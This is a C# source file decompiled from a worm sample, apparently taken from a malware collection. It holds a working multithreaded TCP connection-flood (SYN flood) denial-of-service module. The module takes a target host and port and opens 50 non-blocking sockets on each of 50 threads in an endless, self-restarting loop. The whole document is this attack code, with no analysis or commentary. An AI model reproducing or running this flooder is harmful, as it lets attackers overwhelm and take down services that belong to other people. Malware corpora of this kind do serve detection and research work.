// Decompiled with JetBrains decompiler
// Type: explorer.syn
// Assembly: explorer, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 56E5CD67-A795-400A-AA93-F7890471D495
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00008-msil\Worm.MSIL.Autorun.ig-2c86700b4d3a736629e63a7f91f6e488e611145530107c5a2b53ad8867079764.exe

using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace explorer
{
  internal static class syn
  {
    private static ThreadStart[] _floodingJob;
    private static Thread[] _floodingThread;
    private static IPEndPoint _ipEo;
    private static syn.SendSyn[] _synClass;
    public static string Host;
    public static bool IsEnabled;
    public static int Port = 80;
    public static int SuperSynSockets = 50;
    public static int Threads = 50;

    public static void StartSuperSyn()
    {
      try
      {
        syn._ipEo = new IPEndPoint(Dns.GetHostEntry(syn.Host).AddressList[0], syn.Port);
      }
      catch
      {
        syn._ipEo = new IPEndPoint(IPAddress.Parse(syn.Host), syn.Port);
      }
      syn._floodingThread = new Thread[syn.Threads];
      syn._floodingJob = new ThreadStart[syn.Threads];
      syn._synClass = new syn.SendSyn[syn.Threads];
      for (int index = 0; index < syn.Threads; ++index)
      {
        syn._synClass[index] = new syn.SendSyn(syn._ipEo, syn.SuperSynSockets);
        syn._floodingJob[index] = new ThreadStart(syn._synClass[index].Send);
        syn._floodingThread[index] = new Thread(syn._floodingJob[index]);
        syn._floodingThread[index].Start();
      }
      syn.IsEnabled = true;
    }

    public static void StopSuperSyn()
    {
      for (int index = 0; index < syn.Threads; ++index)
      {
        try
        {
          syn._floodingThread[index].Abort();
          syn._floodingThread[index] = (Thread) null;
          syn._floodingJob[index] = (ThreadStart) null;
          syn._synClass[index] = (syn.SendSyn) null;
        }
        catch
        {
        }
      }
      syn.IsEnabled = false;
    }

    private class SendSyn
    {
      private Socket[] _sock;
      private IPEndPoint ipEo;
      private int SuperSynSockets;

      public SendSyn(IPEndPoint ipEo, int superSynSockets)
      {
        this.ipEo = ipEo;
        this.SuperSynSockets = superSynSockets;
      }

      private static void OnConnect(IAsyncResult ar)
      {
      }

      public void Send()
      {
label_0:
        try
        {
          while (true)
          {
            this._sock = new Socket[this.SuperSynSockets];
            for (int index = 0; index < this.SuperSynSockets; ++index)
            {
              this._sock[index] = new Socket(this.ipEo.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
              this._sock[index].Blocking = false;
              AsyncCallback callback = new AsyncCallback(syn.SendSyn.OnConnect);
              this._sock[index].BeginConnect((EndPoint) this.ipEo, callback, (object) this._sock[index]);
            }
            Thread.Sleep(100);
            for (int index = 0; index < this.SuperSynSockets; ++index)
            {
              if (this._sock[index].Connected)
                this._sock[index].Disconnect(false);
              this._sock[index].Close();
              this._sock[index] = (Socket) null;
            }
            this._sock = (Socket[]) null;
          }
        }
        catch
        {
          for (int index = 0; index < this.SuperSynSockets; ++index)
          {
            try
            {
              if (this._sock != null)
              {
                if (this._sock[index].Connected)
                  this._sock[index].Disconnect(false);
                this._sock[index].Close();
                this._sock[index] = (Socket) null;
              }
            }
            catch
            {
            }
          }
          goto label_0;
        }
      }
    }
  }
}
